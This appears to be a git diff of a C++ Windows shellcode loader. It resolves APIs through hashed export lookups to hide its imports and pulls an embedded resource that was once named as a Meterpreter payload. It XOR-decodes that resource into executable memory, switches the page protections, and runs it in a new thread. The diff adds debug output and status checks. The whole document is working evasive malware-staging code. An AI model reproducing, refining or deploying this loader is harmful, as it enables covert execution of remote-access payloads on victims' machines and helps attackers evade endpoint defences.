@@ -1,9 +1,9 @@
-#include <monolith.hpp>
-#include <definitions.hpp>
-#include <multitool.hpp>
-#include <cstdint>
+#include "monolith.hpp"
+#include "definitions.hpp"
+#include "multitool.hpp"
+#include "resource.hpp"
 
-#include "resource.h"
+#include <cstdint>
 
 #define FVN_OFFSET		(const unsigned int) 2166136261
 #define FVN_PRIME		(const unsigned int) 16777619
@@ -61,14 +61,14 @@ FARPROC GetSymbolAddress(HMODULE base, DWORD hash) {
 		return nullptr;
 	}
 	auto doshead	= (PIMAGE_DOS_HEADER)base;
-	auto nthead		= (PIMAGE_NT_HEADERS)((PBYTE)base + doshead->e_lfanew);
+	auto nthead	= (PIMAGE_NT_HEADERS)((PBYTE)base + doshead->e_lfanew);
 	auto exports	= (PIMAGE_EXPORT_DIRECTORY)((PBYTE)doshead + (nthead)->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
 
 	if (exports->AddressOfNames) {
 
 		auto ordinals	= RVA(PWORD, base, exports->AddressOfNameOrdinals);
 		auto functions	= RVA(PDWORD, base, exports->AddressOfFunctions);
-		auto names		= RVA(PDWORD, base, exports->AddressOfNames);
+		auto names	= RVA(PDWORD, base, exports->AddressOfNames);
 
 		for (auto i = 0; i < exports->NumberOfNames; i++) {
 			auto name = RVA(LPSTR, base, names[i]);
@@ -87,30 +87,43 @@ int main() {
 	HANDLE hThread;
 	DWORD protect;
 	LPVOID lpBuffer;
+	NTSTATUS ntstatus;
 
 	RtlAllocateHeap_t RtlAllocateHeap = (RtlAllocateHeap_t)GetSymbolAddress(GetModuleAddress(NTDLL), RTLALLOCATEHEAP);
 	PRESOURCE resource = (PRESOURCE)RtlAllocateHeap(LOCAL_HEAP, NULL, sizeof(PRESOURCE));
 	PAPI instance = (PAPI)RtlAllocateHeap(LOCAL_HEAP, NULL, sizeof(API));
 
+	printf("resolving api\n");
 	ResolveApi(instance);
 
-	resource			= (PRESOURCE) instance->win32.RtlAllocateHeap(GetProcessHeap, NULL, sizeof(RESOURCE));
-	resource->Id		= MAKEINTRESOURCEA(IDR_METERPRETER_BIN1);
-	resource->Object	= instance->win32.FindResourceA(NULL, resource->Id, resource->Id);
+	resource		= (PRESOURCE) instance->win32.RtlAllocateHeap(LOCAL_HEAP, NULL, sizeof(RESOURCE));
+	resource->Id		= MAKEINTRESOURCEA(SHELLCODE);
+	resource->Object	= instance->win32.FindResourceA(NULL, resource->Id, RT_RCDATA);
 	resource->Length	= instance->win32.SizeofResource(NULL, resource->Object);
-	resource->hGlobal = instance->win32.LoadResource(NULL, resource->Object);
+	resource->hGlobal 	= instance->win32.LoadResource(NULL, resource->Object);
 
-	instance->win32.NtAllocateVirtualMemory(GetCurrentProcess(), &lpBuffer, NULL, (PSIZE_T) &resource->Length, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-	x_memcpy(lpBuffer, resource->hGlobal, resource->Length);
+	printf("resource loaded, allocating\n");
 
-	for (auto i = 0; i < resource->Length; i++) {
-		((PBYTE)lpBuffer)[i] ^= 0x0A;
+	ntstatus = instance->win32.NtAllocateVirtualMemory(NtCurrentProcess(), &lpBuffer, NULL, &resource->Length, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+	if (NT_SUCCESS(ntstatus)) {
+
+		printf("copying resources to buffer\n");
+		x_memcpy(lpBuffer, resource->hGlobal, resource->Length);
+
+		printf("decipher\n");
+		for (auto i = 0; i < resource->Length; i++) {
+			((PBYTE)lpBuffer)[i] ^= 0x0A;
+		}
+
+		printf("changing page protections\n");
+		ntstatus = instance->win32.NtProtectVirtualMemory(NtCurrentProcess(), &lpBuffer, &resource->Length, PAGE_EXECUTE_READ, &protect);
+		if (NT_SUCCESS(ntstatus)) {
+			printf("creating thread\n");
+			hThread = instance->win32.CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)lpBuffer, NULL, NULL, NULL);
+			instance->win32.NtWaitForSingleObjectEx(hThread, FALSE, INFINITE);
+		} 	
 	}
-
-	if (NT_SUCCESS(instance->win32.NtProtectVirtualMemory(GetCurrentProcess(), &lpBuffer, &resource->Length, PAGE_EXECUTE_READ, &protect))) {
-		hThread = instance->win32.CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)lpBuffer, NULL, NULL, NULL);
-		instance->win32.NtWaitForSingleObjectEx(hThread, FALSE, INFINITE);
-	}
+	printf("exit code: 0x%lx\n", ntstatus);
 	return 0;
 }
 
